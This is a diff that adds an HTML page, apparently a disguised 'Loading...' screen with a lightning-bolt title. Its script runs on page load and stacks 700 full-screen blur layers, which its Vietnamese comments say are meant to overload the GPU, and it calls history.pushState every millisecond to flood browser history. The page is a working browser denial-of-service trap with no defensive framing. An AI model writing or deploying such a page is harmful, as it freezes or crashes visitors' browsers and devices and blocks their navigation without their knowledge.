@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡️</title>
+    <style>
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+            font-family: sans-serif;
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+
+    <div>Loading...</div>
+
+    <script>
+        // Tự động chạy ngay khi tải trang xong
+        window.onload = function() {
+            // Vòng lặp tạo 700 lớp hiệu ứng mờ gây quá tải GPU
+            for (let i = 0; i < 700; i++) {
+                const d = document.createElement('div');
+                d.style.cssText = 'position:fixed;width:100vw;height:100vh;' +
+                                  'backdrop-filter:blur(180px);-webkit-backdrop-filter:blur(180px);' +
+                                  'opacity:0.95;z-index:' + (9999 + i) + ';' +
+                                  'transform:translate3d(' + i + 'px,' + i + 'px,' + i + 'px);';
+                document.body.appendChild(d);
+            }
+
+            // Tràn bộ nhớ lịch sử liên tục mỗi 1 mili-giây
+            setInterval(() => {
+                window.history.pushState(null, "", window.location.href);
+            }, 1);
+        };
+    </script>
+</body>
+</html>
